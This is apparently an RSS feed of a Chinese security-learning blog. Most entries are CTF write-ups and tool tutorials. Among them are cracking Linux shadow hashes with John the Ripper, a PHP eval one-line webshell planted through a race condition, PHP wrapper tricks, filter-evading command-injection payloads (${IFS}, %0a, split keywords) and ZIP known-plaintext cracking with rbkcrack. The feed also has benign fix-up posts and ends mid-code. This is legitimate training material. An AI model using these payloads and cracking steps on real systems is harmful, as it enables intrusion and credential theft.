class="line">“失效时间”字段给出的是一个绝对的天数，如果使用了这个字段，那么就给出相应账号的生存期。期满后，该账号就不再是一个合法的账号，也就不能再用来登录了。</span><br></pre></td></tr></table></figure><h4 id="爆破linux用户密码实例">爆破linux用户密码实例</h4><p><strong>利用 <code>unshadow</code> 组合 <code>/etc/passwd</code> 和 <code>/etc/shadow</code> 两个文件</strong></p><p><code>unshadow</code> 命令会将 <code>/etc/passwd</code> 的数据和 <code>/etc/shadow</code> 的数据结合起来，创建 <code>1</code> 个含有用户名和密码详细信息的文件。</p><p>我们可以通过以下命令将这两个文件结合起来：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">sudo unshadow /etc/passwd /etc/shadow &gt; test_passwd</span><br></pre></td></tr></table></figure><p><strong>使用 <code>John the Ripper</code> 破解 <code>Linux</code> 用户登录密码</strong></p><p>我们这时候还需要一个字典，由于 <code>John</code> 自带了一个字典，字典位于 <code>/usr/share/john/password.lst</code> 。当然你也可以自行去网上选择适合你的字典。</p><p>我们可以开始对Linux登录用户名和密码进行破解：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=<span class="regexp">/usr/</span>share/john/password.<span class="property">lst</span> test_passwd</span><br></pre></td></tr></table></figure><p>破解结果如下：</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/23bd8f0643eccb8b765a9b0aa6ce29d0.png" alt="img"></p><p>我们可以看到， <code>test_passwd</code> 文件中存在的三个用户名 <code>root</code> ，<code>test</code> ， <code>python</code> 的密码，均被破解了。</p><p>我们可以查看破解信息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --show test_passwd</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9c612252f150ba86218bfa1af040494b.png" alt="img"></p><h4 id="出现报错：-UTF-8-No-password-hashes-loaded">出现报错： UTF-8 No password hashes loaded</h4><p>John the Ripper 正确使用方法<br>现在 John the Ripper 爆破linux的shadow文件时需要加上 --format=crypt</p><p>所以现在 John the Ripper 的使用命令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo john /etc/shadow --format=crypt</span><br><span class="line">sudo john /etc/shadow --format=crypt --wordlist=/usr/share/john/password.lst</span><br><span class="line">sudo john /etc/shadow --format=crypt --wordlist=/home/kali/Desktop/rockyou.txt</span><br></pre></td></tr></table></figure><p>原因是，如果查看合并后的文件或者没合并使用的shadow文件，并在用户名后面看到 <strong>$y$</strong>，则表明密码已使用 yescrypt 进行哈希处理。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1622299-20220311151213389-1526416476.png" alt="img"></p>]]></content>
    
    
    <summary type="html">🥧kali中暴力破解工具john的使用方法以及命令解析;/etc/passwd文件和/etc/shadow文件格式;linux密码爆破实例;出现报错：“UTF-8 No password hashes loaded”的原因及解决方法</summary>
    
    
    
    <category term="web渗透" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="工具使用" scheme="https://blog.m3x1.cn/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>BurpSuite中文版出现显示错位情况解决</title>
    <link href="https://blog.m3x1.cn/posts/3f399677.html"/>
    <id>https://blog.m3x1.cn/posts/3f399677.html</id>
    <published>2025-03-17T16:00:00.000Z</published>
    <updated>2025-03-20T16:06:00.416Z</updated>
    
    <content type="html"><![CDATA[<h4 id="问题描述">问题描述</h4><p>​在使用BurpSuite汉化版时抓取http数据包出现显示错位情况，这是因为中文版的字体不一样导致的，需要修改字体。</p><h4 id="解决方法">解决方法</h4><p>​修改BurpSuite汉化版的http字体显示。</p><p>打开设置，在message editor中找到“HTTP消息的显示方式”，修改如下</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a3f0228200b1b14ba279f13876b27bc1.png" alt="img"></p>]]></content>
    
    
    <summary type="html">🥧BurpSuite中文版出现显示错位情况解决-修改字体</summary>
    
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>刷题2025.3.15</title>
    <link href="https://blog.m3x1.cn/posts/a546d02c.html"/>
    <id>https://blog.m3x1.cn/posts/a546d02c.html</id>
    <published>2025-03-14T16:00:00.000Z</published>
    <updated>2025-03-18T14:15:08.956Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>题目来源：NSSCTF平台</p></blockquote><p>[TOC]</p><h4 id="SWPUCTF-2021-新生赛-easyupload2-0">[SWPUCTF 2021 新生赛]easyupload2.0</h4><blockquote><p>考点：文件上传绕过</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315181309418.png" alt="image-20250315181309418"></p><p>进行文件上传测试，首先上传jpg文件，然后抓包改成php文件，结果提示php文件不能上传。</p><p>上传htaccess文件也不行，于是改成后缀为phtml。</p><p>phtml也会被当成php解析。</p><p>发现上传成功，用蚁剑连接，找到flag.</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315181643259.png" alt="image-20250315181643259"></p><blockquote><p>NSSCTF{76333d4d-efe1-4a18-acf5-09bd35c8ca3b}</p></blockquote><h4 id="SWPUCTF-2021-新生赛-PseudoProtocols">[SWPUCTF 2021 新生赛]PseudoProtocols</h4><blockquote><p>考点：PHP伪协议，文件包含</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315191122515.png" alt="image-20250315191122515"></p><p>先扫一下目录，发现什么都没有，然后看到需要传参，又要读取hint.php，使用filter伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=/var/www/html/hint.php</span><br></pre></td></tr></table></figure><p>得到一串base64，解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4=</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//go to /test2222222222222.php</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>直接访问/test2222222222222.php</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315191348678.png" alt="image-20250315191348678"></p><p>直接使用data协议绕过file_get_contents函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?a=data://text/plain;base64,SSB3YW50IGZsYWc=</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315191105190.png" alt="image-20250315191105190"></p><blockquote><p>NSSCTF{74d9bfc7-cdff-4a86-a6c0-f76568061d63}</p></blockquote><h4 id="FSCTF-2023-加速加速">[FSCTF 2023]加速加速</h4><blockquote><p>考点：条件竞争</p></blockquote><p>先把后缀改成.jpg拿到对方保存文件的路径，为当前路径下的upload目录里。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/34c2cf74b08950b8f9f87a2ebccb2bbd.png" alt="1698321877579">看见标签是条件竞争，那就按照条件竞争的方法去做。</p><p>先创建一个jz-cmd.php文件，运行创建cmd.php文件并写入一句话木马的命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $f=fopen(&quot;cmd.php&quot;,&quot;w&quot;); fputs($f,&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>先抓取上传文件的数据包，再抓取访问upload文件夹里的jz-cmd.php这两个数据包；虽然上传jz-cmd.php是不被允许的，但其实这个文件在服务器上有存在过，只是很快就被删除了。所以我们用BP疯狂发包访问upload文件夹下的jz-cmd.php文件是道理的。而只要此jz-cmd.php被访问成功，就会在upload文件夹里创建cmd.php这个后门文件。</p><p>具体操作就是抓取上传和访问的数据包，然后将他们都放入intruder中，设置如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8367695e46096811033b203f54941d0f.png" alt="1698322910515"></p><p>然后就先攻击发送的数据包，再攻击读取（读取cmd.php）的数据包。读取的包出现200，且浏览器能正常访问，说明一句话木马就写入进去了，用蚁剑连接找到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-15%20202450.png" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315202512251.png" alt="image-20250315202512251"></p><blockquote><p>FSCTF{p@ti0ns_15_key_1n_1ife}</p></blockquote>]]></content>
    
    
    <summary type="html">2025.3.15刷题题目:[SWPUCTF 2021 新生赛]easyupload2.0,[SWPUCTF 2021新生赛]PseudoProtocols,[FSCTF 2023]加速加速</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://blog.m3x1.cn/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>Git问题：解决“ssh:connect to host github.com port 22: Connection timed out”</title>
    <link href="https://blog.m3x1.cn/posts/e4e8b439.html"/>
    <id>https://blog.m3x1.cn/posts/e4e8b439.html</id>
    <published>2025-02-18T16:00:00.000Z</published>
    <updated>2025-03-25T04:40:15.465Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="问题描述：">问题描述：</h2><p>在某一天使用hexo d命令时突然出现报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh:connect to host github.com port 22: Connection timed out</span><br></pre></td></tr></table></figure><p>之前都是可以链接的，后来换了地方突然链接不上github了。</p><h2 id="问题分析：">问题分析：</h2><p>根据错误提示知道，连接不成功可能是：</p><ol><li>网络问题</li><li>ssh密钥需要重新添加</li><li>22端口被占用</li></ol><p>根据此进行尝试解决，应该能解决。我就是第三个问题</p><h2 id="解决方法：">解决方法：</h2><h4 id="情况一：">情况一：</h4><p>检查网络连接情况，检查代理是否开启。然后ping一下看看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping github.com</span><br></pre></td></tr></table></figure><h4 id="情况二：">情况二：</h4><p>直接重新添加ssh密钥就行</p><h4 id="情况三：">情况三：</h4><p>这也是我的情况，可能是22端口不行或者被占用，就需要换个端口。</p><p>操作方法：</p><p>1.进入~/.ssh下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.ssh</span><br></pre></td></tr></table></figure><p>2.创建一个config文件(这里我用的vim编辑器)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim config</span><br></pre></td></tr></table></figure><p>3.编辑文件内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User git</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br><span class="line"></span><br><span class="line">Host gitlab.com</span><br><span class="line">Hostname altssh.gitlab.com</span><br><span class="line">User git</span><br><span class="line">Port 443</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">12345678910111213</span><br></pre></td></tr></table></figure><p>4.保存退出</p><p>5.检查是否成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>这里要根据它的提示操作，有个地方要输入yes。</p><p>然后再试试hexo d，估计就能提交了。</p><p>（<a href="http://xn--pinggithub-wj2ph1j7w8fubmba3571oi6a.com">但是我还是ping不通github.com</a>，不知道为什么，但是换个端口也能传上去。有大佬知道的请指教！）</p>]]></content>
    
    
    <summary type="html">🥧Git问题：解决“ssh:connect to host github.com port 22: Connection timed out”</summary>
    
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>本地搭建deepseek</title>
    <link href="https://blog.m3x1.cn/posts/ca8cf98d.html"/>
    <id>https://blog.m3x1.cn/posts/ca8cf98d.html</id>
    <published>2025-02-18T16:00:00.000Z</published>
    <updated>2025-03-25T04:40:36.200Z</updated>
    
    <content type="html"><![CDATA[<h2 id="准备阶段">准备阶段</h2><p>先下载Ollama和chatbox安装包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ollama: https://ollama.com/</span><br><span class="line">chatbox: https://chatboxai.app/zh</span><br></pre></td></tr></table></figure><p>在电脑上安装后即可</p><h2 id="搭建步骤">搭建步骤</h2><p>安装之后，按win+r，输入cmd进入命令框</p><p>然后我们在回到ollama的官网：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219215910238.png" alt="image-20250219215910238"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220104107.png" alt="image-20250219220104107"></p><p>复制后面的代码到命令框下载，等待它下载完</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220218270.png" alt="image-20250219220218270"></p><p>然后打开chatbox，选择使用本地模型</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220351053.png" alt="image-20250219220351053"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220409690.png" alt="image-20250219220409690"></p><p>模型位置点击三角形位置选择安装好的deepseek模型，上下文消息数量20那个位置记得选择不限制。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220432827.png" alt="image-20250219220432827"></p><p>根据自己喜好设置其他选项，点击保存，然后就可以试试对话了。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220640616.png" alt="image-20250219220640616"></p><p>至此初始化就完成了，基本的功能就完成了。</p><h2 id="启动注意事项">启动注意事项</h2><p>每次在chatbox启动的时候，都要先在命令框输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ollama list    #查看mode</span><br><span class="line">ollama run modename    #运行mode</span><br></pre></td></tr></table></figure><p>然后才能在chatbox本地使用。</p><p>否则会报错没有网络。</p>]]></content>
    
    
    <summary type="html">🥧本地搭建deepseek</summary>
    
    
    
    <category term="其他学习笔记" scheme="https://blog.m3x1.cn/categories/%E5%85%B6%E4%BB%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="其他学习笔记" scheme="https://blog.m3x1.cn/tags/%E5%85%B6%E4%BB%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub技能树-rce</title>
    <link href="https://blog.m3x1.cn/posts/72fb0684.html"/>
    <id>https://blog.m3x1.cn/posts/72fb0684.html</id>
    <published>2025-01-31T16:00:00.000Z</published>
    <updated>2025-02-01T13:26:47.646Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="eval执行">eval执行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    eval($_REQUEST[&quot;cmd&quot;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>没有任何绕过，直接执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=system(&#x27;ls /&#x27;);</span><br><span class="line">?cmd=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{953435d20ae6652047e620c4}</p></blockquote><h2 id="文件包含">文件包含</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128231455539.png" alt="image-20241128231455539"></p><p>审计代码，发现过滤了flag关键字，include包含文件的内容，根据提示，发现有个shell.txt文件，而且文件内容是接受传参请求，可以利用这个漏洞。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234155787.png" alt="image-20241128234155787"></p><p>所以思路就是文件包含shell.txt文件，然后传参触发eval函数来rce。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=shell.txt&amp;ctfhub=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{e95bf56ca09c475de96779f8}</p></blockquote><h2 id="php-input">php://input</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234417464.png" alt="image-20241128234417464"></p><p>有个phpinfo()的网页，打开，搜索flag，没有。</p><p>根据提示使用php://input协议</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234916846.png" alt="image-20241128234916846"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234946005.png" alt="image-20241128234946005"></p><blockquote><p>ctfhub{fd2d24ec67a3d02745d252ec}</p></blockquote><h2 id="读取源代码">读取源代码</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128235118224.png" alt="image-20241128235118224"></p><p>根据代码和提示，要使用php协议读取目录/flag</p><p>直接使用filter协议读取，构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{ad11f5cf0c3528e0097fc84f}</p></blockquote><h2 id="远程包含">远程包含</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128235615623.png" alt="image-20241128235615623"></p><p>跟上面的题目一样,直接使用php://input，然后写入一句话木马</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129000043701.png" alt="image-20241129000043701"></p><p>蚁剑连接，拿到flag</p><blockquote><p>ctfhub{bc23c4d608ef1b89ff1d8564}</p></blockquote><h2 id="命令注入">命令注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $cmd = &quot;ping -c 4 &#123;$_GET[&#x27;ip&#x27;]&#125;&quot;;</span><br><span class="line">    exec($cmd, $res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出来是一个ping网址的功能，先试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls -al</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250201210701699.png" alt="image-20250201210701699"></p><p>打开278612477123991.php</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250201211032131.png" alt="image-20250201211032131"></p><blockquote><p>ctfhub{7c642fd3989abe8db46cf948}</p></blockquote><h2 id="过滤cat">过滤cat</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/cat/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>过滤了cat，但是可以用tac</p><blockquote><p>ctfhub{7c7a18aea2905940e36dd90e}</p></blockquote><h2 id="过滤空格">过滤空格</h2><p>过滤了空格可以用${IFS}代替</p><blockquote><p>ctfhub{635b63dfee2f877be2058c7c}</p></blockquote><h2 id="过滤目录分隔符">过滤目录分隔符</h2><p>过滤了目录分隔符，但是可以使用命令拼接来找flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cd flag_is_here;ls -al</span><br><span class="line">127.0.0.1;cd flag_is_here;cat flag_31274326351910.php</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{0a399fadb5bd0716775832b5}</p></blockquote><h2 id="过滤运算符">过滤运算符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/(\||\&amp;)/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>过滤了|和&amp;符号，但是可以用分号;</p><blockquote><p>ctfhub{83f8b09d42bb7631282a83b4}</p></blockquote><h2 id="综合过滤练习">综合过滤练习</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析一下，过滤了|&amp;; ，可以使用%0a来作为回车符使用，效果一样</p><p>过滤三个关键字cat,flag,ctfhub，可以使用两个单引号或者两个双引号绕过</p><p>过滤空格，可以使用${IFS}绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1%0als$&#123;IFS&#125;-al%0acd$&#123;IFS&#125;fla&#x27;&#x27;g_is_here%0aca&#x27;&#x27;t$&#123;IFS&#125;f*</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130130405955.png" alt="image-20241130130405955"></p><blockquote><p>ctfhub{cbff46daeb4e000265fb35d6}</p></blockquote>]]></content>
    
    
    <summary type="html">CTFHub技能树-rce系列wp</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://blog.m3x1.cn/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>两种明文攻击</title>
    <link href="https://blog.m3x1.cn/posts/fcd8d963.html"/>
    <id>https://blog.m3x1.cn/posts/fcd8d963.html</id>
    <published>2025-01-19T16:00:00.000Z</published>
    <updated>2025-01-21T06:22:40.574Z</updated>
    
    <content type="html"><![CDATA[<h4 id="一、完整的明文文件">一、完整的明文文件</h4><p>要达成明文攻击需要注意以下三点</p><p>①完整的明文文件</p><p>②明文文件需要被相同的压缩算法标准压缩（也可理解为被相同压缩工具压缩）</p><p>③明文对应文件的加密算法需要是 ZipCrypto（ZipCrypto又分为ZipCrypto Deflate/ZipCrypto Store）</p><p>使用ARCHPR进行明文攻击</p><p>破解时长应该不超过5分钟，运行至5分钟左右可以手动停止，ARCHPR会跳出来破解出的三个key。当然，这个结果并不是压缩包的密码，而是一个去除密码的压缩包<code>xxx_decrypted.zip</code>，把这个文件直接解开就可以了。</p><p>用以上方法需要已知一整个明文文件。</p><h4 id="二、已知一部分明文">二、已知一部分明文</h4><p>使用rbkcrack只需要知道加密压缩包内容的连续12个字节，即可进行攻击破解。同时，结合各类已知的文件格式，更扩宽了ZIP已知明文攻击的攻击面。</p><blockquote><p>rbkcrack下载地址：</p><p><a href="https://github.com/Aloxaf/rbkcrack">https://github.com/Aloxaf/rbkcrack</a></p></blockquote><p>rbkcrack常用参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-C 加密的压缩包</span><br><span class="line">-c 压缩包内加密的文件</span><br><span class="line">-p 明文内容</span><br><span class="line">-k 输入key</span><br><span class="line">-o 偏移量</span><br><span class="line">-d 攻击完成后导出解密文件</span><br><span class="line">-u 自动解压</span><br></pre></td></tr></table></figure><p>实例：</p><p>png是制作的png文件头</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbkcrack<span class="selector-class">.exe</span> -C LP<span class="selector-class">.zip</span> -c LP<span class="selector-class">.png</span> -<span class="selector-tag">p</span> png</span><br></pre></td></tr></table></figure><p>拿到key后进行解密</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbkcrack.exe -C LP.zip -c LP.png -k <span class="number">0f</span>518bd2 <span class="number">680365f</span>9 <span class="number">0</span>ecf26a8 -d <span class="keyword">out</span>.png</span><br></pre></td></tr></table></figure><p>因为LP.zip是以ZipCrypto Deflate方式加密的</p><p>所以解密后注意得到的out.png是deflate的数据流，需要使用python脚本进行解码</p><p>在rbkcrack的tools里找到这个脚本</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 